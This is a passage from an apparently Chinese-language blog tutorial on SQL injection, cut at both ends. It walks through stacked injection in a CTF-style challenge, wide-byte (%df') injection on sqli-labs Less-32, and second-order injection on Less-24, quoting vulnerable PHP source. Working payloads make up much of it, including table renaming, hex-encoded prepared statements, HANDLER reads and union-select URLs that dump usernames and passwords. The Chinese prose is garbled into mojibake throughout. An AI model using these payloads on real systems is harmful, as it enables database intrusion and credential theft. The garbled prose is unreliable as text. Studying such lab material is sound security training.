<p>æ ¹æ®è¿”å›ä¿¡æ¯å‘ç°å­˜åœ¨è¿‡æ»¤ï¼Œå¸¸ç”¨æ•æ„Ÿå­—ç¬¦å‡è¢«è¿‡æ»¤ï¼›ä½†æ˜¯æ²¡æœ‰è¿‡æ»¤åˆ†å·ï¼Œå°è¯•ä½¿ç”¨å †å æ³¨å…¥è·å–è¡¨å;</p>
<p><code>1&#39;;show tables;#</code></p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128161756298.png" alt="image-20210128161756298" loading="lazy"></p>
<p>å°è¯•è·å–wordsè¡¨ä¸­çš„å­—æ®µï¼›<code>1&#39;;show columns from words;#</code></p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128162804831.png" alt="image-20210128162804831" loading="lazy"></p>
<p>å°è¯•è·å–<code>1919810931114514</code>è¡¨ä¸­çš„å­—æ®µï¼›</p>
<p><code>1&#39;;show columns from ``1919810931114514``;#</code>æ³¨ï¼šè‹¥è¡¨åä¸ºçº¯æ•°å­—æ—¶ï¼ŒæŸ¥è¯¢å­—æ®µéœ€è¦å°†è¡¨åç”¨åå¼•å·åŒ…è£¹èµ·æ¥</p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128164413693.png" alt="image-20210128164413693" loading="lazy"></p>
<p>ç›®å‰å·²ç»è·å–åˆ°äº†è¡¨ä¸­<code>flag</code>çš„å­—æ®µåï¼Œæ€ä¹ˆè·å–å­—æ®µå†…å®¹æ˜¯å…³é”®ç‚¹ï¼›</p>
<p>è§£æ³•ä¸€ï¼šä½¿ç”¨<code>rename</code>æŠŠ<code>words</code>è¡¨æ›´åä¸ºå…¶ä»–çš„è¡¨åï¼›åœ¨æŠŠè¡¨<code>1919810931114514</code>æ”¹æˆ<code>words</code>;ç»™æ–°<code>words</code>è¡¨æ·»åŠ æ–°çš„åˆ—å<code>id</code>;å°†<code>flag</code>æ”¹åä¸º<code>data</code>;</p>
<p><code>payload1</code>:</p>
<pre class="language-none"><code class="language-none">0&#39;;rename table words to words1;rename table &#96;1919810931114514&#96; to words;alter table words change flag id varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;desc  words;#</code></pre>

<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128180359265.png" alt="image-20210128180359265" loading="lazy"></p>
<p><code>payload12</code>:</p>
<pre class="language-none"><code class="language-none">1&#39; or 1&#x3D;1#</code></pre>

<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128180506380.png" alt="image-20210128180506380" loading="lazy"></p>
<p>è§£æ³•äºŒï¼š</p>
<pre class="language-none"><code class="language-none">å°†select * from &#96; 1919810931114514 &#96;è¿›è¡Œ16è¿›åˆ¶ç¼–ç ï¼›
åœ¨æ„é€ payloadï¼š
1&#39;;SeT@a&#x3D;0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;#</code></pre>

<ul>
<li><code>prepareâ€¦fromâ€¦</code>æ˜¯é¢„å¤„ç†è¯­å¥ï¼Œä¼šè¿›è¡Œç¼–ç è½¬æ¢ã€‚</li>
<li><code>execute</code>ç”¨æ¥æ‰§è¡Œç”±<code>SQLPrepare</code>åˆ›å»ºçš„<code>SQL</code>è¯­å¥ã€‚</li>
<li><code>SELECT</code>å¯ä»¥åœ¨ä¸€æ¡è¯­å¥é‡Œå¯¹å¤šä¸ªå˜é‡åŒæ—¶èµ‹å€¼,è€Œ<code>SET</code>åªèƒ½ä¸€æ¬¡å¯¹ä¸€ä¸ªå˜é‡èµ‹å€¼ã€‚</li>
</ul>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128180652574.png" alt="image-20210128180652574" loading="lazy"></p>
<p>è§£æ³•ä¸‰ï¼š</p>
<p><code>payload:</code></p>
<pre class="language-none"><code class="language-none">1&#39;; handler &#96;1919810931114514&#96; open as &#96;a&#96;; handler &#96;a&#96; read next;#</code></pre>

<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128180652574.png" alt="image-20210128180652574" loading="lazy"></p>
<h1 id="å®½å­—èŠ‚æ³¨å…¥"><a href="#å®½å­—èŠ‚æ³¨å…¥" class="headerlink" title="å®½å­—èŠ‚æ³¨å…¥"></a>å®½å­—èŠ‚æ³¨å…¥</h1><h2 id="å®½å­—èŠ‚æ³¨å…¥çš„æ¦‚å¿µ"><a href="#å®½å­—èŠ‚æ³¨å…¥çš„æ¦‚å¿µ" class="headerlink" title="å®½å­—èŠ‚æ³¨å…¥çš„æ¦‚å¿µ"></a>å®½å­—èŠ‚æ³¨å…¥çš„æ¦‚å¿µ</h2><p>â€¢ å®½å­—èŠ‚æ˜¯ç›¸å¯¹äº<code>ascii</code>è¿™æ ·çš„å•å­—èŠ‚è€Œè¨€çš„ï¼›åƒ<code>GB2312ã€GBKã€GB18030ã€BIG5ã€Shift_IIS</code>ç­‰è¿™äº›éƒ½æ˜¯å¸¸è¯´çš„å®½å­—èŠ‚ï¼Œå®é™…ä¸Šåªæœ‰ä¸¤ä¸ªå­—èŠ‚</p>
<p>â€¢ <code>GBK</code>æ˜¯ä¸€ç§å¤šå­—ç¬¦ç¼–ç ï¼Œé€šå¸¸æ¥è¯´ï¼Œä¸€ä¸ª<code>gbk</code>ç¼–ç æ±‰å­—ã€å ç”¨2ä¸ªå­—èŠ‚ã€‚ä¸€ä¸ª<code>utf-8</code>ç¼–ç çš„æ±‰å­—ï¼Œå ç”¨3ä¸ªå­—èŠ‚</p>
<h2 id="å®½å­—èŠ‚æ³¨å…¥çš„åŸç†"><a href="#å®½å­—èŠ‚æ³¨å…¥çš„åŸç†" class="headerlink" title="å®½å­—èŠ‚æ³¨å…¥çš„åŸç†"></a>å®½å­—èŠ‚æ³¨å…¥çš„åŸç†</h2><p><code>GBK</code> å ç”¨ä¸¤å­—èŠ‚ï¼Œ<code>ASCII</code>å ç”¨ä¸€å­—èŠ‚</p>
<p><code>PHP</code>ä¸­ç¼–ç ä¸º<code>GBK</code>ï¼Œå‡½æ•°æ‰§è¡Œæ·»åŠ çš„æ˜¯<code>ASCII</code>ç¼–ç ï¼ˆæ·»åŠ çš„ç¬¦å·ä¸ºâ€œ\â€ï¼‰ï¼Œ<code>MYSQL</code>é»˜è®¤å­—ç¬¦é›†æ˜¯<code>GBK</code>ç­‰å®½å­—èŠ‚å­—ç¬¦é›†ã€‚</p>
<p>å¤§å®¶éƒ½çŸ¥é“<code>%df&#39;</code>è¢«<code>PHP</code>è½¬ä¹‰ï¼ˆå¼€å¯<code>GPC</code>ã€ç”¨a<code>ddslashes</code>å‡½æ•°ï¼Œæˆ–è€…<code>icov</code>ç­‰ï¼‰ï¼Œå•å¼•å·è¢«åŠ ä¸Šåæ–œæ <code>\</code>ï¼Œå˜æˆäº† <code>%df\&#39;</code>ï¼Œå…¶ä¸­<code>\</code>çš„åå…­è¿›åˆ¶æ˜¯<code> %5C</code> ï¼Œé‚£ä¹ˆç°åœ¨ <code>%df\â€™ =%df%5c%27</code>ï¼Œå¦‚æœç¨‹åºçš„é»˜è®¤å­—ç¬¦é›†æ˜¯<code>GBK</code>ç­‰å®½å­—èŠ‚å­—ç¬¦é›†ï¼Œåˆ™<code>MySQL</code>ç”¨<code>GBK</code>çš„ç¼–ç æ—¶ï¼Œä¼šè®¤ä¸º<code>%df%5c </code>æ˜¯ä¸€ä¸ªå®½å­—ç¬¦ï¼Œä¹Ÿå°±æ˜¯ç¸—ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼š<code>%df\â€™ = %df%5c%27=ç¸—â€™</code>ï¼Œæœ‰äº†å•å¼•å·å°±å¥½æ³¨å…¥äº†ã€‚</p>
<h2 id="å®½å­—èŠ‚æ³¨å…¥å‰ææ¡ä»¶"><a href="#å®½å­—èŠ‚æ³¨å…¥å‰ææ¡ä»¶" class="headerlink" title="å®½å­—èŠ‚æ³¨å…¥å‰ææ¡ä»¶"></a>å®½å­—èŠ‚æ³¨å…¥å‰ææ¡ä»¶</h2><p>ç®€å•ç†è§£:</p>
<p>æ•°æ®åº“ç¼–ç ä¸<code>PHP</code>ç¼–ç è®¾ç½®ä¸ºä¸åŒçš„ä¸¤ä¸ªç¼–ç é‚£ä¹ˆå°±æœ‰å¯èƒ½äº§ç”Ÿå®½å­—èŠ‚æ³¨å…¥</p>
<p>æ·±å…¥è®²è§£ï¼š</p>
<p>è¦æœ‰å®½å­—èŠ‚æ³¨å…¥æ¼æ´ï¼Œé¦–å…ˆè¦æ»¡è¶³æ•°æ®åº“åç«¯ä½¿ç”¨åŒ/å¤šå­—èŠ‚è§£æ<code>SQL</code>è¯­å¥ï¼Œå…¶æ¬¡è¿˜è¦ä¿è¯åœ¨è¯¥ç§å­—ç¬¦é›†èŒƒå›´ä¸­åŒ…å«ä½å­—èŠ‚ä½æ˜¯ <code>0x5C(01011100) </code>çš„å­—ç¬¦ï¼Œåˆæ­¥çš„æµ‹è¯•ç»“æœ <code>Big5 </code>å’Œ<code> GBK</code> å­—ç¬¦é›†éƒ½æ˜¯æœ‰çš„ï¼Œ <code>UTF-8</code> å’Œ <code>GB2312</code> æ²¡æœ‰è¿™ç§å­—ç¬¦ï¼ˆä¹Ÿå°±ä¸å­˜åœ¨å®½å­—èŠ‚æ³¨å…¥ï¼‰ã€‚</p>
<h2 id="å®½å­—èŠ‚æ³¨å…¥çš„åˆ©ç”¨-sqlilab-less38"><a href="#å®½å­—èŠ‚æ³¨å…¥çš„åˆ©ç”¨-sqlilab-less38" class="headerlink" title="å®½å­—èŠ‚æ³¨å…¥çš„åˆ©ç”¨(sqlilab-less38)"></a>å®½å­—èŠ‚æ³¨å…¥çš„åˆ©ç”¨(sqlilab-less38)</h2><p>æµ‹è¯•é¡µé¢å­˜åœ¨æ³¨å…¥ç‚¹</p>
<p>é¦–å…ˆæˆ‘ä»¬ç”¨å¸¸è§„æµ‹è¯•æ–¹æ³•å¸¦å…¥å•å¼•å·ï¼Œåˆ¤æ–­å½“å‰é¡µé¢æ˜¯å¦å­˜åœ¨æ³¨å…¥ã€‚å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128150312508.png" alt="image-20210128150312508" loading="lazy"></p>
<p>é€šè¿‡å›¾ç‰‡æˆ‘ä»¬å‘ç°å½“å‰é¡µé¢æ•°æ®å›æ˜¾ç»“æœæ˜¯æ­£å¸¸çš„ï¼Œä¸‹é¢æç¤ºä¿¡æ¯æˆ‘ä»¬çœ‹åˆ°ï¼ŒåŸæ¥æˆ‘ä»¬å¸¦å…¥çš„å•å¼•å·è¢«å¢åŠ ä¸€åæ–œæ è½¬ä¹‰äº†ï¼Œæ‰€ä»¥å¯¼è‡´æˆ‘ä»¬çš„å•å¼•å·å¸¦å…¥å¤±æ•ˆã€‚è¿™è¾¹æˆ‘ä»¬å¯ä»¥è”æƒ³åˆ°æºç ä¸­å¯èƒ½ç”¨äº†<code>addslashes</code>å‡½æ•°ç­‰æˆ‘ä»¬å¸¦å…¥çš„ç‰¹æ®Šå­—ç¬¦è¿›è¡Œäº†è½¬ä¹‰ã€‚</p>
<p>æŸ¥çœ‹æºç </p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">check_addslashes</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token variable">$string</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token variable">$string</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token comment">// take the variables </span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
<span class="token variable">$id</span><span class="token operator">=</span><span class="token function">check_addslashes</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//echo "The filtered request is :" .$id . "&lt;br>";</span>

<span class="token comment">//logging the connection parameters to a file for analysis.</span>
<span class="token variable">$fp</span><span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'result.txt'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'ID:'</span><span class="token operator">.</span><span class="token variable">$id</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// connectivity </span>

<span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"SET NAMES gbk"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"SELECT * FROM users WHERE id=<span class="token interpolation"><span class="token variable">$id</span></span> LIMIT 0,1"</span><span class="token punctuation">;</span>
<span class="token variable">$result</span><span class="token operator">=</span><span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$row</span> <span class="token operator">=</span> <span class="token function">mysql_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>

<p>é€šè¿‡æºç æˆ‘ä»¬çœ‹åˆ°mysqlè®¾ç½®äº†gbkçš„ç¼–ç æ–¹å¼ï¼Œè¿™è¾¹æˆ‘ä»¬æƒ³åˆ°å®½å­—èŠ‚æ³¨å…¥ã€‚</p>
<p><code>http://192.168.31.220:8080/Less-32/?id=1%df&#39;</code></p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128150415389.png" alt="image-20210128150415389" loading="lazy"></p>
<p>æˆ‘ä»¬å‘ç°æ­¤æ—¶é¡µé¢æŠ¥é”™ï¼Œè¿™æ˜¯<code>php</code>ä½¿ç”¨<code>addslashes</code>å‡½æ•°å°†<code>%df&#39;</code>ä¸­çš„å•å¼•å·è½¬ä¹‰ï¼Œå½¢æˆ<code>%df\&#39;</code>ã€‚<code>mysql</code>çš„<code>gbk</code>ç¼–ç æŠŠ<code>%df\</code>è®¤ä¸ºæ˜¯ä¸€ä¸ªæ±‰å­—ï¼Œæ­¤æ—¶å•å¼•å·å°±æˆåŠŸé€ƒé€¸å‡ºæ¥ï¼Œäº§ç”Ÿäº†æ³¨å…¥ã€‚åé¢ä½¿ç”¨å¸¸è§çš„è”åˆæ³¨å…¥å³å¯ã€‚</p>
<p>çŒœè§£æ•°æ®å</p>
<p>é¦–å…ˆä½¿ç”¨order byå‡½æ•°åˆ¤æ–­å½“å‰åº“çš„å­—æ®µæ•°é‡</p>
<p><code>http://192.168.31.220:8080/Less-32/?id=-1%df&#39; order by 4--+</code></p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128150542009.png" alt="image-20210128150542009" loading="lazy"></p>
<p>å¸¦å…¥å‚æ•°4æ—¶ï¼Œæ•°æ®åº“æŠ¥é”™ã€‚åˆ¤æ–­å½“å‰å­—æ®µæ•°é‡ä¸º4</p>
<p><code>http://192.168.31.220:8080/Less-32/?id=-1%df&#39; union select 1,database(),3--+</code></p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128150618966.png" alt="image-20210128150618966" loading="lazy"></p>
<p>è·å–åˆ°å½“å‰æ•°æ®åº“çš„åç§°ä¸ºsecurity</p>
<p>çŒœè§£åº“ä¸­çš„è¡¨å</p>
<p><code>http://192.168.31.220:8080/Less-32/?id=-1%df&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+</code></p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128150640389.png" alt="image-20210128150640389" loading="lazy"></p>
<p>è·å–å½“å‰åº“ä¸‹çš„è¡¨åä¸º<code>emails,referers,uagents,users</code></p>
<p>çŒœè§£usersè¡¨ä¸­çš„å­—æ®µå</p>
<p><code>http://192.168.31.220:8080/Less-32/?id=-1%df&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=0x27736563757269747927 and table_name=0x27757365727327--+</code></p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128150840816.png" alt="image-20210128150840816" loading="lazy"></p>
<p>è·å–å­—æ®µå†…å®¹</p>
<p><code>http://192.168.31.220:8080/Less-32/?id=-1%df&#39; union select 1,group_concat(username,password),3 from users--+</code></p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128150906850.png" alt="image-20210128150906850" loading="lazy"></p>
<h1 id="äºŒæ¬¡æ³¨å…¥"><a href="#äºŒæ¬¡æ³¨å…¥" class="headerlink" title="äºŒæ¬¡æ³¨å…¥"></a>äºŒæ¬¡æ³¨å…¥</h1><h2 id="æ³¨å…¥å’ŒäºŒæ¬¡æ³¨å…¥çš„åŒºåˆ«"><a href="#æ³¨å…¥å’ŒäºŒæ¬¡æ³¨å…¥çš„åŒºåˆ«" class="headerlink" title="æ³¨å…¥å’ŒäºŒæ¬¡æ³¨å…¥çš„åŒºåˆ«"></a>æ³¨å…¥å’ŒäºŒæ¬¡æ³¨å…¥çš„åŒºåˆ«</h2><p><code>sql</code>æ³¨å…¥æµç¨‹ï¼š</p>
<p>â€¢      1.æ”»å‡»è€…åœ¨æ³¨å…¥ç‚¹è¾“å…¥æ¶æ„<code>sql</code>è¯­å¥ï¼Œé€šè¿‡<code>http</code>è¯·æ±‚æäº¤ï¼›</p>
<p>â€¢      2.æœåŠ¡å™¨ä¸­çš„åº”ç”¨ç¨‹åºå¤„ç†æ¶æ„çš„<code>sql</code>ï¼Œå¹¶å‘æ”»å‡»è€…è¿”å›æ³¨å…¥ç»“æœï¼›</p>
<p>äºŒæ¬¡æ³¨å…¥æµç¨‹ï¼š</p>
<p>â€¢      1.æ”»å‡»è€…åœ¨æ³¨å…¥ç‚¹æäº¤æ¶æ„<code>sql</code>è¯­å¥ï¼›</p>
<p>â€¢      2.é€šè¿‡<code>http</code>è¯·æ±‚ï¼Œå°†æ¶æ„<code>sql</code>ä¿å­˜åˆ°åº”ç”¨ç¨‹åºçš„æ•°æ®åº“ä¸­ï¼›</p>
<p>â€¢      3.æ”»å‡»è€…ç¬¬äºŒæ¬¡æäº¤<code>http</code>è¯·æ±‚ï¼›</p>
<p>â€¢      4.æœåŠ¡å™¨å¤„ç†ç¬¬äºŒæ¬¡<code>http</code>è¯·æ±‚ï¼Œæ£€ç´¢å­˜å‚¨åœ¨æ•°æ®åº“ä¸­çš„æ¶æ„<code>sql</code>ï¼Œæ„é€ <code>sql</code>è¯­å¥ï¼›</p>
<p>â€¢      5.æœåŠ¡å™¨å‘æ”»å‡»è€…è¿”å›æ³¨å…¥ç»“æœï¼›</p>
<h2 id="äºŒæ¬¡æ³¨å…¥çš„åŸç†"><a href="#äºŒæ¬¡æ³¨å…¥çš„åŸç†" class="headerlink" title="äºŒæ¬¡æ³¨å…¥çš„åŸç†"></a>äºŒæ¬¡æ³¨å…¥çš„åŸç†</h2><p>æ•°æ®é¦–æ¬¡æ’å…¥åˆ°æ•°æ®åº“ä¸­æ—¶ï¼Œåº”ç”¨ç¨‹åºä¼šä»¥ï¼ˆ <code>addslashes</code> æˆ–è€…æ˜¯å€ŸåŠ©<code>get*magic*quotes_gpc</code> å¯¹å…¶ä¸­çš„ç‰¹æ®Šå­—ç¬¦è¿›è¡Œè½¬ä¹‰)å®‰å…¨çš„æ–¹å¼å¤„ç†è¿™äº›æ•°æ®,ä½†æ˜¯ï¼Œè¿™äº›æ•°æ®å¯èƒ½ä¼šè¢«åº”ç”¨ç¨‹åºæœ¬èº«æˆ–è€…å…¶ä»–çš„åç«¯è¿›ç¨‹ä¼šä»¥å±é™©çš„æ–¹å¼å¤„ç†è¿™äº›æ•°æ®ï¼Œä»è€Œé€ æˆäº†äºŒæ¬¡æ³¨å…¥ã€‚</p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128151053028.png" alt="image-20210128151053028" loading="lazy"></p>
<h2 id="äºŒæ¬¡æ³¨å…¥çš„åˆ©ç”¨"><a href="#äºŒæ¬¡æ³¨å…¥çš„åˆ©ç”¨" class="headerlink" title="äºŒæ¬¡æ³¨å…¥çš„åˆ©ç”¨"></a>äºŒæ¬¡æ³¨å…¥çš„åˆ©ç”¨</h2><p>åˆ¤æ–­æ³¨å…¥ç‚¹</p>
<p>åœ¨Less-24å®éªŒä¸­ï¼Œé¦–é¡µçš„ç™»å½•ç•Œé¢è¿›è¡Œç›¸åº”çš„åˆ¤æ–­æµ‹è¯•ï¼Œæµ‹è¯•åˆ¤æ–­æ˜¯å¦å­˜åœ¨æ³¨å…¥ç‚¹ã€‚ä½†æ˜¯ä¸ç®¡æ€ä¹ˆæ„é€ å‚æ•°å¸¦å…¥å‡å‘ç°é¡µé¢å¦‚ä¸‹æƒ…å†µï¼Œæ²¡æœ‰ä»»ä½•å…¶ä»–å˜åŒ–ï¼Œæ‰€ä»¥åˆ¤æ–­æ­¤å¤„æ— æ³¨å…¥ç‚¹ã€‚</p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128151119696.png" alt="image-20210128151119696" loading="lazy"></p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128151124989.png" alt="image-20210128151124989" loading="lazy"></p>
<p>æºç åˆ†æ</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">sqllogin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
 
  <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token function">mysql_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"login_user"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token function">mysql_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"login_password"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT * FROM users WHERE username='<span class="token interpolation"><span class="token variable">$username</span></span>' and password='<span class="token interpolation"><span class="token variable">$password</span></span>'"</span><span class="token punctuation">;</span>
 <span class="token comment">//$sql = "SELECT COUNT(*) FROM users WHERE username='$username' and password='$password'";</span>
  <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'You tried to be real smart, Try harder!!!! :( '</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token variable">$row</span> <span class="token operator">=</span> <span class="token function">mysql_fetch_row</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">//print_r($row) ;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
           <span class="token keyword">return</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
         <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
 
 <span class="token punctuation">&#125;</span></code></pre>

<p>é€šè¿‡ä»£ç åˆ†æå‘ç°ï¼Œæ•°æ®æ¥æ”¶å‚æ•°<code>login_user</code>å’Œ<code>login_password</code>éƒ½ä¼šç»è¿‡å‡½æ•°<code>mysql_real_escape_stringï¼ˆï¼‰</code>å¤„ç†å­—ç¬¦ä¸²ã€‚</p>
<p>æ­¤å‡½æ•°çš„å…·ä½“å®šä¹‰å¦‚ä¸‹ï¼š</p>
<p><code>mysql_real_escape_string</code>å‡½æ•°è½¬ä¹‰<code>SQL</code>è¯­å¥ä¸­ä½¿ç”¨çš„å­—ç¬¦ä¸²ä¸­çš„ç‰¹æ®Šå­—ç¬¦.</p>
<p>å—å½±å“å­—ç¬¦ï¼š</p>
<pre class="language-none"><code class="language-none">\x00

\n

\r

\

&#39;

&quot;

\x1a</code></pre>

<p>ä½¿ç”¨æ­¤å‡½æ•°åï¼ŒåŸºæœ¬ä¸Šä½¿ç”¨è¿™ä¸ªç‚¹æ³¨å…¥ä¸å¤ªå¯èƒ½ã€‚</p>
<p>é¦–é¡µçš„ç™»å½•é¡µä¸è¡Œï¼Œå‘ç°ç™»å½•é¡µä¸‹é¢è¿˜æœ‰ä¸¤ä¸ªåŠŸèƒ½ã€‚ä¸€ä¸ªæ˜¯å¿˜è®°å¯†ç ï¼Œä½ ä¸€ä¸ªæ³¨å†Œæ–°ç”¨æˆ·ã€‚</p>
<p>è¿™é‡Œæˆ‘ä»¬é¦–å…ˆæ³¨å†Œä¸€ä¸ª<code>test</code>ç”¨æˆ·ï¼Œå¯†ç ä¸º<code>111111</code>ï¼Œç„¶åä½¿ç”¨æ­¤ç”¨æˆ·è¿›è¡Œç™»å½•ï¼Œç™»å½•åçš„é¡µé¢å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128151147487.png" alt="image-20210128151147487" loading="lazy"></p>
<p>æˆ‘ä»¬å‘ç°ç™»å½•æˆåŠŸä¹‹åæ˜¯ä¸€ä¸ªç”¨æˆ·çš„ç™»å½•åå°é¡µï¼Œå¹¶ä¸”è¯¥é¡µé¢æ”¯æŒå½“å‰ç”¨æˆ·çš„å¯†ç ä¿®æ”¹ï¼Œä¿®æ”¹å¯†ç çš„ä»£ç é¡µåç§°ä¸º<code>pass_change.php</code>.</p>
<p>æˆ‘ä»¬æŸ¥çœ‹å½“å‰é¡µé¢ä¿®æ”¹å¯†ç çš„æºä»£ç ï¼Œå¹¶è¿›è¡Œç›¸åº”çš„åˆ†æï¼š</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
 <span class="token punctuation">&#123;</span>
    
    
    \<span class="token comment"># Validating the user input........</span>
    <span class="token variable">$username</span><span class="token operator">=</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"username"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$curr_pass</span><span class="token operator">=</span> <span class="token function">mysql_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'current_password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$pass</span><span class="token operator">=</span> <span class="token function">mysql_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$re_pass</span><span class="token operator">=</span> <span class="token function">mysql_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'re_password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$pass</span><span class="token operator">==</span><span class="token variable">$re_pass</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>   
        <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"UPDATE users SET PASSWORD='<span class="token interpolation"><span class="token variable">$pass</span></span>' where username='<span class="token interpolation"><span class="token variable">$username</span></span>' and password='<span class="token interpolation"><span class="token variable">$curr_pass</span></span>' "</span><span class="token punctuation">;</span>
        <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'You tried to be smart, Try harder!!!! :( '</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$row</span> <span class="token operator">=</span> <span class="token function">mysql_affected_rows</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;font size="3" color="#FFFF00">'</span><span class="token punctuation">;</span>
